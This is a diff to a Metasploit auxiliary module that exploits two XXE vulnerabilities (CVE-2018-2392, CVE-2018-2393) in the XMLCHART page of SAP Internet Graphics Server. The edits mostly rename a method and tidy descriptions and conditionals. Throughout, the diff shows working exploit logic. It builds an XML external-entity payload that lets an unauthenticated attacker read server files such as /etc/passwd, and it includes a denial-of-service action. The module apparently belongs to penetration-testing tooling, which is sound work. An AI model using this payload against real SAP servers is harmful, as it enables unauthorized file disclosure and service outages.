@@ -12,11 +12,12 @@ class MetasploitModule < Msf::Auxiliary
     super(
         update_info(
           info,
-          'Name' => 'SAP Internet Graphics Server (IGS) XXE',
+          'Name' => 'SAP Internet Graphics Server (IGS) XMLCHART XXE',
           'Description' => %q{
-            This module implements the SAP Internet Graphics Server (IGS) XXE attack.
-            An unauthenticated attacker can remotely read files in the server's file system, for example: /etc/passwd
-            Vulnerable SAP IGS versions: 7.20, 7.20EXT, 7.45, 7.49, 7.53
+            This module exploits CVE-2018-2392 and CVE-2018-2393, two XXE vulnerabilities within the XMLCHART page
+            of SAP Internet Graphics Servers (IGS) running versions 7.20, 7.20EXT, 7.45, 7.49, or 7.53. Successful
+            exploitation will allow unauthenticated remote attackers to read files from the server as the XXX user,
+            or conduct a denial of service attack against the vulnerable SAP IGS server.
           },
           'Author' => [
             'Yvan Genuer', # @_1ggy The Security Researcher who originally found the vulnerability
@@ -40,12 +41,12 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::RPORT(40080),
         OptString.new('FILE', [ true, 'File to read from the remote server', '/etc/passwd']),
-        OptString.new('URN', [ false, 'SAP IGS XMLCHART URN/URL', '/XMLCHART']),
+        OptString.new('URN', [ true, 'Path to the SAP IGS XMLCHART page from the web root', '/XMLCHART']),
       ]
     )
   end
 
-  def get_variables
+  def setup_xml_and_variables
     @host = @datastore['RHOSTS']
     @port = @datastore['RPORT']
     @urn = @datastore['URN']
@@ -79,7 +80,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def make_xxe_xml(file_name)
-    get_variables
+    setup_xml_and_variables
     entity = Rex::Text.rand_text_alpha(5)
     @xxe_xml[:data] = %(<?xml version='1.0' encoding='UTF-8'?>
     <!DOCTYPE Extension [<!ENTITY #{entity} SYSTEM "#{file_name}">]>
@@ -95,7 +96,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def make_post_data(file_name, dos = false)
-    get_variables
+    setup_xml_and_variables
 
     if !dos
       make_xxe_xml(file_name)
@@ -160,8 +161,7 @@ class MetasploitModule < Msf::Auxiliary
         print_error("Failed to retrieve SAP IGS page: #{@schema}#{@host}:#{@port}#{@download_link}")
         vprint_error("Error #{e.class}: #{e}")
       end
-      fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@urn}") if second_response.nil?
-      fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@urn}") unless second_response.code == 200
+      fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@urn}") if second_response.nil? || second_response.code != 200
       get_file_content(second_response.body)
     else
       print_status("System is vulnerable, but the file #{@file} was not found on the host #{@host}")
@@ -171,9 +171,9 @@ class MetasploitModule < Msf::Auxiliary
   def check
 
     # Set up XML data for HTTP request
-    get_variables
+    setup_xml_and_variables
     make_post_data('/etc/os-release', false) # Create a XML data payload to retrieve the value of /etc/os-release
-                                             # so that the module can check if the target is vulnerable or not.
+    # so that the module can check if the target is vulnerable or not.
 
     # Send HTTP request
     begin
@@ -192,7 +192,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     # Check HTTP response
-    if check_response.nil? || check_response.code != 200 || !(check_response.body.include?('Picture') && check_response.body.include?('Info')) || !(check_response.body.match?(/ImageMap|Errors/))
+    if check_response.nil? || check_response.code != 200 || !(check_response.body.include?('Picture') && check_response.body.include?('Info')) || !check_response.body.match?(/ImageMap|Errors/)
       return Exploit::CheckCode::Safe
     end
 
@@ -247,7 +247,7 @@ class MetasploitModule < Msf::Auxiliary
   def action_file_read
 
     # Set up XML data for HTTP request
-    get_variables
+    setup_xml_and_variables
     make_post_data(@file, false)
 
     # Send HTTP request
@@ -267,7 +267,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     # Check first HTTP response
-    if first_response.nil? || first_response.code != 200 || !(first_response.body.include?('Picture') && first_response.body.include?('Info')) || !(first_response.body.match?(/ImageMap|Errors/))
+    if first_response.nil? || first_response.code != 200 || !(first_response.body.include?('Picture') && first_response.body.include?('Info')) || !first_response.body.match?(/ImageMap|Errors/)
       fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@urn}")
     end
 
@@ -294,7 +294,7 @@ class MetasploitModule < Msf::Auxiliary
   def action_dos
 
     # Set up XML data for HTTP request
-    get_variables
+    setup_xml_and_variables
     make_post_data(@file, true)
 
     # Send HTTP request
